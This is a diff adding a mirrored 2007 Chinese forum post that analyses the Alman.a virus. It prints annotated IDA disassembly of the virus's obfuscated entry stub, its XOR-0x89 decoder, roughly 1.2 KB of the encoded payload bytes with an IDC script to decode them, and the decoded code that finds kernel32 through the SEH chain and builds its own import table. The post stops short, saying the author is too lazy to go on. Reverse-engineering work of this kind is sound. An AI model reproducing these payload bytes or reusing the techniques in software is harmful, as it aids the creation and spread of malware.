@@ -1,0 +1,321 @@
+
+
+# Alman.a 病毒分析
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-147.htm`](https://www.pediy.com/kssd/pediy09/pediy09-147.htm)
+
+> .text:131510B8                 public start  
+> .text:131510B8 start           proc near  
+> .text:131510B8                 and     ebx, 0FFFFFFFFh  
+> .text:131510BB                 nop  
+> .text:131510BC                 sub     ecx, 0  
+> .text:131510BF loc\_131510BF:   
+> .text:131510BF                 mov     esi, esi  
+> .text:131510C1                 nop  
+> .text:131510C2                 nop  
+> .text:131510C3                 nop  
+> .text:131510C4                 nop  
+> .text:131510C5                 nop  
+> .text:131510C6                 sub     ebx, 0  
+> .text:131510C9                 jmp     short $+2  
+> .text:131510CB                 push    esp  
+> .text:131510CC                 pop     esp  
+> .text:131510CD                 mov     edi, edi  
+> .text:131510CF                 mov     esi, esi  
+> .text:131510D1                 push    ebx  
+> .text:131510D2                 pop     ebx  
+> .text:131510D3                 sub     ebx, 0  
+> .text:131510D6                 nop  
+> .text:131510D7                 and     ebx, 0FFFFFFFFh  
+> .text:131510DA                 nop  
+> .text:131510DB                 add     eax, 0  
+> .text:131510DE                 or      ecx, 0  
+> .text:131510E1                 nop  
+> .text:131510E2                 push    eax  
+> .text:131510E3                 pop     eax  
+> .text:131510E4                 mov     edi, edi  
+> .text:131510E6 loc\_131510E6:  
+> .text:131510E6                 and     eax, 0FFFFFFFFh  
+> .text:131510E9                 xor     ecx, 0  
+> .text:131510EC                 sub     eax, 0  
+> .text:131510EF                 jmp     short loc\_13151102  
+> .text:131510EF  
+> .text:131510EF start           endp  
+> .text:131510F1 ; ---------------------------------------------------------------------------  
+> .text:131510F1                 xor     ebx, eax  
+> .text:131510F3                 int     3   
+> .text:131510F4 loc\_131510F4:   
+> .text:131510F4                 pop     ebx  
+> .text:131510F5                 mov     ecx, 4CDh  
+> .text:131510FA Decode:  
+> .text:131510FA                 xor     byte ptr \[ecx+ebx\], 89h  
+> .text:131510FE                 loop    Decode          ; 解码 @encode\_data1  
+> .text:131510FE                                         ;  
+> .text:131510FE                                         ; 解码脚本:  
+> .text:131510FE                                         ; auto i;  
+> .text:131510FE                                         ; auto addr;  
+> .text:131510FE                                         ;  
+> .text:131510FE                                         ; addr = 0x13151108;  
+> .text:131510FE                                         ; for (i=addr; i<addr+0x4cd; i++)  
+> .text:131510FE                                         ; {  
+> .text:131510FE                                         ;     Message("%02x decode:%02x\\n", Byte(i), Byte(i)⁰x89 );  
+> .text:131510FE                                         ;     PatchByte(i, Byte(i)⁰x89);  
+> .text:131510FE                                         ; }  
+> .text:13151100                 jmp     short @encode\_data1 ; 跳转到解码后的代码  
+> .text:13151102 ; ---------------------------------------------------------------------------  
+> .text:13151102 loc\_13151102:  
+> .text:13151102                 call    loc\_131510F4  
+> .text:13151107                 cld  
+> .text:13151108  
+>   
+>   
+> 开始前先用异或 89 解码下面数据:  
+> .text:13151108 @encode\_data1   db  62h, 8Dh,0D9h, 89h, 89h, 89h, 61h, 80h, 89h, 89h, 89h, 61h, 7Ch, 88h, 89h, 89h; 0  
+> .text:13151108                 db  4Ah, 7Ah, 2Dh, 4Ah,0DCh,   2, 65h, 0Ah, 4Dh, 75h,0BAh, 7Fh,0EDh, 24h,0C9h,0FDh; 16  
+> .text:13151108                 db  8Ch,0C1h, 1Fh, 24h, 62h, 71h, 24h, 1Ah,0C2h,0EFh,0BAh, 52h,0EFh,   8,0B2h,0C4h; 32  
+> .text:13151108                 db 0D3h,0FCh, 7Ch,   2, 7Ah, 8Ah,0FAh,0B5h,   8,0B7h,0D9h,0CCh, 89h, 89h,0FCh, 61h; 48  
+> .text:13151108                 db    0,0D4h, 75h,   2, 5Ah, 8Ah,0DBh,0B5h,   2,0DBh,0F1h, 8Ah,0DCh, 75h,   2,0D3h; 64  
+> .text:13151108                 db 0A9h, 8Ah,0D4h, 75h,0BAh, 49h,0E3h, 87h,0D0h,   2,0B2h, 8Ah,0F4h, 75h,   8,0B6h; 80  
+> .text:13151108                 db 0CEh,0ECh,0FDh,0D9h,0FCh, 82h,   8,0F6h, 8Dh,0FBh,0E6h,0EAh,0C8h,0FCh, 8Bh, 62h; 96  
+> .text:13151108                 db  80h, 0Ah, 4Ah, 8Dh,0C9h,0B2h,0CBh, 91h,0FCh, 55h,   2,0D3h,0ADh, 8Ah,0D4h, 75h; 112  
+> .text:13151108                 db  86h, 3Eh, 85h,0CAh,   2,0D3h, 95h, 8Ah,0D4h, 75h,   2, 8Dh,   2, 8Ah,0CCh, 75h; 128  
+> .text:13151108                 db  61h, 89h, 89h, 89h, 89h,0D2h,   8, 62h, 1Ch, 99h,0C9h, 89h,   0, 0Ah,0D4h, 98h; 144  
+> .text:13151108                 db 0C9h, 89h, 61h,0F9h, 89h, 89h, 89h,0C5h,0E6h,0E8h,0EDh,0C5h,0E0h,0EBh,0FBh,0E8h; 160  
+> .text:13151108                 db 0FBh,0F0h,0C8h, 89h,0CAh,0FBh,0ECh,0E8h,0FDh,0ECh,0CFh,0E0h,0E5h,0ECh,0C8h, 89h; 176  
+> .text:13151108                 db 0DEh,0FBh,0E0h,0FDh,0ECh,0CFh,0E0h,0E5h,0ECh, 89h,0CAh,0E5h,0E6h,0FAh,0ECh,0C1h; 192  
+> .text:13151108                 db 0E8h,0E7h,0EDh,0E5h,0ECh, 89h,0DFh,0E0h,0FBh,0FDh,0FCh,0E8h,0E5h,0C8h,0E5h,0E5h; 208  
+> .text:13151108                 db 0E6h,0EAh, 89h,0E5h,0FAh,0FDh,0FBh,0EAh,0E8h,0FDh,0C8h, 89h,0CEh,0ECh,0FDh,0DEh; 224  
+> .text:13151108                 db 0E0h,0E7h,0EDh,0E6h,0FEh,0FAh,0CDh,0E0h,0FBh,0ECh,0EAh,0FDh,0E6h,0FBh,0F0h,0C8h; 240  
+> .text:13151108                 db  89h,0CEh,0ECh,0FDh,0DFh,0E6h,0E5h,0FCh,0E4h,0ECh,0C0h,0E7h,0EFh,0E6h,0FBh,0E4h; 256  
+> .text:13151108                 db 0E8h,0FDh,0E0h,0E6h,0E7h,0C8h, 89h,0D6h, 61h,0A9h, 89h, 89h, 89h, 89h, 89h, 89h; 272  
+> .text:13151108                 db  89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h; 288  
+> .text:13151108                 db  89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h, 89h,0D7h, 30h, 81h; 304  
+> .text:13151108                 db  89h, 89h, 89h,0D8h,0DEh, 76h,0FCh, 75h, 76h, 1Ah,0D4h, 98h,0C9h, 89h,   0, 8Fh; 320  
+> .text:13151108                 db  0Ah, 4Fh, 8Dh, 75h,0BAh, 49h, 7Bh, 27h,0D0h, 6Bh, 61h, 40h, 4Ah, 89h, 89h, 89h; 336  
+> .text:13151108                 db  89h, 61h, 89h, 89h, 89h, 89h,0D1h,0A4h,0EFh, 98h,0C9h, 89h, 32h,0EFh, 98h,0C9h; 352  
+> .text:13151108                 db  89h, 8Ah, 51h,0C2h,0EFh,0BAh, 52h,0EFh,   8,0B2h,0C4h,0D3h,0FCh, 7Ch,   2, 7Ah; 368  
+> .text:13151108                 db  8Ah,0FAh,0B5h,   8,0B7h,0D9h,0CCh, 89h, 89h,0FCh, 61h,   2, 4Ah, 4Ah,0DCh,   2; 384  
+> .text:13151108                 db  65h, 0Ah, 4Dh, 71h,0E3h, 89h,0E3h, 89h,0E3h, 89h,0E3h, 89h,   4,0CCh, 75h,0D9h; 400  
+> .text:13151108                 db 0E3h, 89h,0E3h, 89h, 61h, 8Dh, 89h, 89h, 89h,0CAh,0B3h,0D5h, 89h, 76h, 1Ah,0B0h; 416  
+> .text:13151108                 db  98h,0C9h, 89h, 61h, 8Eh, 89h, 89h, 89h,0FCh,0FAh,0ECh,0FBh,0BAh,0BBh, 89h, 76h; 432  
+> .text:13151108                 db  1Ah, 94h, 98h,0C9h, 89h, 61h, 83h, 89h, 89h, 89h,0FEh,0FAh,0F9h,0FBh,0E0h,0E7h; 448  
+> .text:13151108                 db 0FDh,0EFh,0C8h, 89h,0D9h, 76h, 1Ah,0D4h, 98h,0C9h, 89h,   0,0CCh, 71h,   2,0CCh; 464  
+> .text:13151108                 db  75h,0BAh, 5Bh, 30h, 6Eh, 8Ah, 89h, 89h, 7Eh, 78h,0DBh, 61h, 82h, 89h, 89h, 89h; 480  
+> .text:13151108                 db 0EAh,0D6h,0ACh,0B9h,0BAh,0EDh,0A7h,0E7h,0E5h,0FAh, 89h, 76h,0FCh, 81h, 76h,0DCh; 496  
+> .text:13151108                 db  71h, 40h, 4Bh, 8Dh, 89h,0DCh,   2, 65h,   8, 4Dh,0F9h, 76h, 76h, 76h, 61h, 89h; 512  
+> .text:13151108                 db  89h, 89h, 89h,0D2h,   8, 62h, 9Ah, 9Bh,0C9h, 89h,0E3h, 8Dh,0E1h, 89h, 99h, 89h; 528  
+> .text:13151108                 db  89h,0E1h, 89h, 41h, 89h, 89h,0E3h, 89h, 76h, 1Ah,0A4h, 98h,0C9h, 89h, 0Ch, 49h; 544  
+> .text:13151108                 db  86h, 0Dh, 53h, 89h, 89h, 89h,   0,0CCh, 7Dh, 61h,0AAh, 76h, 76h, 76h,   0,0CCh; 560  
+> .text:13151108                 db  65h, 8Ch, 89h,0D9h, 89h, 89h,   0,0CCh, 75h,   2, 59h,   2,0CBh, 8Dh,   0,0CCh; 576  
+> .text:13151108                 db  71h,   2, 8Bh, 8Ah, 59h, 0Ah, 4Bh, 85h,   4,0CCh, 79h,0D9h, 76h,0FCh, 7Dh, 76h; 592  
+> .text:13151108                 db 0FCh, 71h,0DBh, 61h,   4, 88h, 89h, 89h, 61h, 89h, 89h, 89h, 89h,0D2h,   8, 62h; 608  
+> .text:13151108                 db 0E4h, 9Bh,0C9h, 89h,   4,0DCh,   1,0E3h,0EDh,0DBh, 76h, 1Ah,0BCh, 98h,0C9h, 89h; 624  
+> .text:13151108                 db  61h, 8Ah, 89h, 89h, 89h,0D5h,0D5h, 89h,   4,0DCh,   1,0DBh, 76h, 1Ah,0B8h, 98h; 640  
+> .text:13151108                 db 0C9h, 89h,   4, 3Ch,0FDh, 76h, 76h, 76h,0E9h,0DFh, 61h, 66h, 77h, 76h, 76h,0E8h; 656  
+> .text:13151108                 db 0DFh,   4,0DCh,   1,0DBh, 76h, 1Ah,0B8h, 98h,0C9h, 89h,0E3h, 89h,0E3h, 89h,0E3h; 672  
+> .text:13151108                 db  8Bh,0E3h, 89h,0E3h, 89h,0E1h, 89h, 89h, 89h,0C9h,   4,0DCh,   1,0DBh, 76h, 1Ah; 688  
+> .text:13151108                 db 0A8h, 98h,0C9h, 89h, 0Ah, 71h, 76h,0FDh,0CEh,   0, 0Ch,0F9h, 76h, 76h, 76h,0E3h; 704  
+> .text:13151108                 db  89h,   4,0CCh, 71h,0D9h, 76h,0FCh, 79h, 76h,0FCh, 7Dh, 76h, 3Ch,0F9h, 76h, 76h; 720  
+> .text:13151108                 db  76h, 76h, 1Ah,0ACh, 98h,0C9h, 89h, 76h, 3Ch,0F9h, 76h, 76h, 76h, 76h, 1Ah,0A0h; 736  
+> .text:13151108                 db  98h,0C9h, 89h,   4,0DCh,   1,0DBh, 76h, 1Ah, 94h, 98h,0C9h, 89h, 0Ch, 49h,0FDh; 752  
+> .text:13151108                 db  86h,0E3h, 8Dh,0D9h, 76h, 1Ah,0D4h, 98h,0C9h, 89h, 0Ch, 49h,0FDh, 8Bh, 76h, 59h; 768  
+> .text:13151108                 db 0E3h,0C9h,0E1h, 89h, 99h, 89h, 89h,0E1h, 89h, 99h, 89h, 89h,0E3h, 89h, 76h, 1Ah; 784  
+> .text:13151108                 db 0A4h, 98h,0C9h, 89h,   0,0CCh, 7Dh, 75h, 37h, 98h, 99h,0C9h, 89h, 8Ah, 7Ah, 30h; 800  
+> .text:13151108                 db  8Ah, 89h, 89h, 89h,   2, 71h, 7Ah, 2Dh,   2,0DCh, 75h,   2,0CBh, 81h,   2,0C4h; 816  
+> .text:13151108                 db  65h, 8Ah, 48h,0D9h,   2, 83h, 0Ah, 4Bh, 85h,   2, 7Bh, 36h, 89h, 99h,0C9h, 89h; 832  
+> .text:13151108                 db  8Ah, 72h,   2, 0Ah, 8Bh, 99h,0C9h, 89h,0A2h, 71h, 75h,   2,0CCh, 7Dh, 76h, 69h; 848  
+> .text:13151108                 db  40h, 4Ah,0DCh,   2, 65h,   2,0C4h, 81h,0DFh,   2,0FCh, 99h, 0Ch, 7Fh,0DEh,   2; 864  
+> .text:13151108                 db  70h,0FDh, 85h,   2,0DCh, 85h,   3, 8Bh,   1, 88h,0C8h,0CBh,0C7h,0FCh, 7Eh,   2; 880  
+> .text:13151108                 db  4Eh,0D6h,0D7h, 40h, 4Bh, 85h, 89h,0DCh,   2, 65h,   2,0C4h, 85h,   2,0DCh, 81h; 896  
+> .text:13151108                 db    2, 48h, 48h, 61h, 8Ah,   2, 8Dh, 8Bh, 0Ah, 68h, 8Eh, 5Ah, 61h, 0Ah, 69h, 88h; 912  
+> .text:13151108                 db  40h, 4Bh, 81h, 89h,0DCh,   2, 65h, 0Ah, 4Dh, 75h,0DAh,0DFh,   2,0FCh, 99h,0DEh; 928  
+> .text:13151108                 db 0BAh, 76h,0BAh, 52h, 62h, 88h,0CAh,0DFh, 76h,0FCh, 85h, 61h, 4Eh, 76h, 76h, 76h; 944  
+> .text:13151108                 db 0CFh,0B2h, 4Eh,0FCh, 78h,   0,0F4h, 75h,0DFh, 76h,0FCh, 85h, 61h, 3Fh, 76h, 76h; 960  
+> .text:13151108                 db  76h,   2, 46h, 5Ah, 69h, 80h,0CCh, 75h,0CEh,0CFh, 0Ah, 76h, 8Ah,0FBh, 60h,   2; 976  
+> .text:13151108                 db 0C4h, 81h,   4,0CAh, 8Dh,   0, 88h,   2,0CCh, 75h,0D6h,0D7h,   4,0CDh, 51h, 88h; 992  
+> .text:13151108                 db 0D2h, 40h, 4Bh, 85h, 89h,0DCh,   2, 65h, 0Ah, 4Dh, 65h,0DFh,0BAh, 7Fh,0B0h,0FCh; 1008  
+> .text:13151108                 db  85h,0DEh,   2,0F4h, 99h, 4Eh,0CCh, 79h, 89h, 75h, 76h, 76h,   0,0F4h, 65h,   0; 1024  
+> .text:13151108                 db 0FCh, 7Dh, 86h, 0Fh, 2Eh, 89h, 89h, 89h,0DAh, 62h, 8Ah,   2,0F4h, 99h,0DFh, 76h; 1040  
+> .text:13151108                 db 0FCh, 81h, 61h,0E9h, 76h, 76h, 76h,0BAh, 52h,0CFh,0B2h, 4Ah,0FDh,0D6h,   2,0CCh; 1056  
+> .text:13151108                 db  79h,0B2h, 4Ah,0F5h, 8Eh, 8Ah, 4Eh,   0,0CCh, 71h, 62h, 84h,0B4h, 89h, 75h, 76h; 1072  
+> .text:13151108                 db  76h,   0,0F4h, 71h,0F4h, 8Ah,   0,0D4h, 71h,0BAh, 76h,0DFh, 76h,0FCh, 81h, 61h; 1088  
+> .text:13151108                 db 0BAh, 76h, 76h, 76h,   2, 46h, 5Ah, 69h, 82h, 51h,0CEh,0CFh, 0Ah, 76h, 83h,0F5h; 1104  
+> .text:13151108                 db  63h,0DFh, 76h,0FCh, 81h,   4,0CCh, 75h,0D9h, 61h,0BFh, 76h, 76h, 76h, 8Ah,0FCh; 1120  
+> .text:13151108                 db  75h,   2, 71h,   2,0CCh, 71h,0DEh, 8Ah, 51h,0DAh, 76h,0FCh, 65h, 61h, 69h, 77h; 1136  
+> .text:13151108                 db  76h, 76h, 88h,0F4h, 65h, 88h,0F4h, 79h, 88h,0F4h, 7Dh, 62h,0A1h,0BAh, 76h,0BBh; 1152  
+> .text:13151108                 db  52h,0DFh, 76h,0FCh, 81h, 61h, 64h, 77h, 76h, 76h,   2, 46h, 5Bh, 69h, 83h, 51h; 1168  
+> .text:13151108                 db 0CEh,0CFh, 0Ah, 76h, 81h,0F5h, 63h,   2,0CCh, 65h, 76h,0CCh, 65h, 76h,0CCh, 79h; 1184  
+> .text:13151108                 db  76h,0CCh, 7Dh,   1, 91h,0B2h,0FCh, 85h, 86h, 0Bh,0D4h, 76h, 76h, 76h,0D2h,   2; 1200  
+> .text:13151108                 db 0CCh, 9Dh,   2,0C4h, 7Dh,0D6h,   0, 81h,0D7h, 40h, 4Bh, 99h, 89h; 1216  
+>   
+>   
+> 解码 IDC 脚本:  
+> auto i;  
+> auto addr;  
+> addr = 0x13151108;  
+> for (i=addr; i<addr+0x4cd; i++)  
+> {  
+>     Message("%02x decode:%02x\\n", Byte(i), Byte(i)⁰x89 );  
+>     PatchByte(i, Byte(i)⁰x89);  
+> }   
+>   
+> 解码后跳转到@encode\_data1 继续执行，这段代码通过 SEH 链来找 kernel32 的 Imagebase。  
+>   
+> .text:13151108 @encode\_data1:                           ; 解码后的代码  
+> .text:13151108                 jmp     short loc\_1315110E   
+> .text:13151108 ; ---------------------------------------------------------------------------  
+> .text:1315110A                 db  50h ; P  
+> .text:1315110B                 db    0  
+> .text:1315110C                 db    0  
+> .text:1315110D                 db    0  
+> .text:1315110E ; ---------------------------------------------------------------------------  
+> .text:1315110E loc\_1315110E:  
+> .text:1315110E                 call    @IAT             ; 这里处理导入函数  
+> .text:1315110E  
+> .text:13151113                 call    @Malice  
+> .text:13151118                 retn  
+> .text:13151119 ; ---------------------------------------------------------------------------  
+> .text:13151119                 rep movsb  
+> .text:1315111B                 retn  
+> .text:1315111C ; ---------------------------------------------------------------------------  
+> .text:1315111C loc\_1315111C:  
+> .text:1315111C                 push    ebp  
+> .text:1315111D                 mov     ebp, esp  
+> .text:1315111F                 add     esp, -4  
+> .text:13151122                 xor     esi, esi  
+> .text:13151124                 lods    dword ptr fs:\[esi\]  
+> .text:13151126  
+> .text:13151126 @find\_seh\_tail:  
+> .text:13151126                 inc     eax  
+> .text:13151127  
+> .text:13151127 loc\_13151127:  
+> .text:13151127                 jz      short loc\_1315112E  
+> .text:13151129                 dec     eax  
+> .text:1315112A                 xchg    eax, esi  
+> .text:1315112B                 lodsd  
+> .text:1315112C                 jmp     short @find\_seh\_tail  
+> .text:1315112C  
+> .text:1315112E ; ---------------------------------------------------------------------------  
+> .text:1315112E  
+> .text:1315112E loc\_1315112E:  
+> .text:1315112E                 lodsd  
+> .text:1315112F                 xchg    eax, ebx  
+> .text:1315112F  
+> .text:13151130  
+> .text:13151130 @find\_krl32\_base:   
+> .text:13151130                     
+> .text:13151130                 dec     ebx  
+> .text:13151131                 xor     bx, bx  
+> .text:13151134                 cmp     word ptr \[ebx\], 5A4Dh ; IMAGE\_DOS\_SIGNATURE  
+> .text:13151139                 jnz     short @find\_krl32\_base  
+> .text:13151139  
+> .text:1315113B                 mov     esi, ebx  
+> .text:1315113D                 add     esi, \[ebx+IMAGE\_DOS\_HEADER.e\_lfanew\]  
+> .text:13151140                 cmp     dword ptr \[esi\], 4550h ; IMAGE\_NT\_SIGNATURE  
+> .text:13151146                 jnz     short @find\_krl32\_base  
+> .text:13151146  
+>   
+> 找到 kernel32 的基地址以后，为了用 kernel32 中的函数下面就是遍历其导出函数，构造自己使用的导入函数表  
+>   
+> .text:13151148                 mov     \[ebp-4\], ebx  
+> .text:1315114B                 mov     edx, ebx  
+> .text:1315114D                 add     edx, \[edx+IMAGE\_DOS\_HEADER.e\_lfanew\]  
+> .text:13151150                 mov     edx, \[edx+IMAGE\_NT\_HEADERS.OptionalHeader.DataDirectory.VirtualAddress\]  
+> .text:13151153                 add     edx, \[ebp-4\]    ; kernel32.dll 导出表地址  
+> .text:13151156                 mov     ebx, \[edx+IMAGE\_EXPORT\_DIRECTORY.AddressOfNames\]  
+> .text:13151159                 add     ebx, \[ebp-4\]  
+> .text:1315115C                 xor     eax, eax  
+> .text:1315115E @find\_exp\_GetProcAddress:   
+> .text:1315115E                 push    0Eh  
+> .text:13151160                 pop     ecx  
+> .text:13151161                 mov     edi, \[ebx\]  
+> .text:13151163                 add     edi, \[ebp-4\]  
+> .text:13151166                 cmp     dword ptr \[edi\], 50746547h ; 'GetP'在内存中是 47 65 74 50,用 DWORD 表示就是 0x50746547  
+> .text:1315116C                 jnz     short loc\_13151179  
+> .text:1315116E                 cmp     dword ptr \[edi+4\], 41636F72h ; 'rocA'这里和前面的连起来就是 'GetProcA'，呵呵在找 'GetProcAddress'  
+> .text:13151175                 jnz     short loc\_13151179  
+> .text:13151177                 jmp     short loc\_13151182  
+> .text:13151179 ; ---------------------------------------------------------------------------  
+> .text:13151179 loc\_13151179:   
+> .text:13151179                 add     ebx, 4  
+> .text:1315117C                 inc     eax  
+> .text:1315117D                 cmp     eax, \[edx+IMAGE\_EXPORT\_DIRECTORY.NumberOfNames\]  
+> .text:13151180 loc\_13151180:    
+> .text:13151180                 jnz     short @find\_exp\_GetProcAddress  
+> .text:13151182 loc\_13151182:   
+> .text:13151182                 mov     ebx, \[edx+IMAGE\_EXPORT\_DIRECTORY.AddressOfNameOrdinals\]  
+> .text:13151185                 add     ebx, \[ebp-4\]  
+> .text:13151188                 movzx   ecx, word ptr \[ebx+eax\*2\]  
+> .text:1315118C                 mov     ebx, \[edx+IMAGE\_EXPORT\_DIRECTORY.AddressOfFunctions\]  
+> .text:1315118F  
+> .text:1315118F loc\_1315118F:    
+> .text:1315118F                 add     ebx, \[ebp-4\]  
+> .text:13151192                 mov     eax, \[ebx+ecx\*4\]  
+> .text:13151195                 add     eax, \[ebp-4\]    ; GetProcAddress 地址  
+> .text:13151198 loc\_13151198:   
+> .text:13151198                 call    $+5  
+> .text:1315119D                 pop     ebx  
+> .text:1315119E                 sub     ebx, 401095h  
+> .text:131511A4 loc\_131511A4:     
+> .text:131511A4                 mov     \[ebx+40115Dh\], eax ; 存储 GetProcAddress 地址到 text:13151265 imp\_GetProcAddress  
+> .text:131511AA loc\_131511AA:   
+> .text:131511AA                 call    make\_IAT        ; 构建病毒要使用的导入函数表  
+> .text:131511AA  
+> .text:131511AA ; ---------------------------------------------------------------------------  
+> .text:131511AF s\_Loadlibrarya\_0   db 'LoadLibraryA',0  
+> .text:131511BC s\_Createfilea      db 'CreateFileA',0   
+> .text:131511C8 s\_Writefile        db 'WriteFile',0     
+> .text:131511D2 s\_Closehandle\_0    db 'CloseHandle',0   
+> .text:131511DE s\_Virtualalloc     db 'VirtualAlloc',0  
+> .text:131511EB s\_Lstrcata         db 'lstrcatA',0  
+> .text:131511F4 s\_Getwindowsdire   db 'GetWindowsDirectoryA',0   
+> .text:13151209 s\_Getvolumeinfor   db 'GetVolumeInformationA',0  
+> .text:1315121F ; ---------------------------------------------------------------------------  
+> .text:1315121F  
+> .text:1315121F make\_IAT:  
+> .text:1315121F                 pop     edi             ; edi 指向上面的字符串列表  
+> .text:13151220                 call    @m\_IAT  
+> .text:13151220 ; ---------------------------------------------------------------------------  
+> .text:13151225 imp\_LoadLibraryA          dd 0  
+> .text:13151229 imp\_CreateFileA           dd 0  
+> .text:1315122D imp\_WriteFile             dd 0  
+> .text:13151231 imp\_CloseHandle           dd 0  
+> .text:13151235 imp\_VirtualAlloc          dd 0  
+> .text:13151239 imp\_lstrcatA              dd 0  
+> .text:1315123D imp\_GetWindowsDirectoryA  dd 0  
+> .text:13151241 imp\_GetVolumeInformationA dd 0  
+> .text:13151245  
+> .text:13151245 ; =============== S U B R O U T I N E =======================================  
+> .text:13151245  
+> .text:13151245 @m\_IAT          proc near                       ; 用 GetProcAddress 获得其他用到的函数地址  
+> .text:13151245                 pop     esi  
+> .text:13151246 loc\_13151246:  
+> .text:13151246                 mov     ecx, 8  
+> .text:1315124B loc\_1315124B:  
+> .text:1315124B                 push    ecx  
+> .text:1315124C                 push    edi  
+> .text:1315124D                 push    dword ptr \[ebp-4\]       ; kernel32 base address  
+> .text:13151250                 call    dword ptr \[ebx+40115Dh\] ; imp\_GetProcAddress  
+> .text:13151256                 mov     \[esi\], eax  
+> .text:13151258                 add     esi, 4  
+> .text:1315125B                 cld  
+> .text:1315125C                 xor     eax, eax  
+> .text:1315125E                 repne scasb  
+> .text:13151260                 pop     ecx  
+> .text:13151261                 loop    loc\_1315124B            ; 循环  
+> .text:13151263                 leave  
+> .text:13151264                 retn  
+> .text:13151264 @m\_IAT          endp ; sp =  4  
+> .text:13151264  
+> .text:13151264 ; ---------------------------------------------------------------------------  
+> .text:13151265 imp\_GetProcAddress  dd 0  
+> .text:13151269  
+>   
+> 懒得写了，传个 idb  
+>   
+>   
+>   
+>         Berglob  
+>         2007-05-18 
+
+ 4dd466d0e1e0cc123afbe504da2462ca
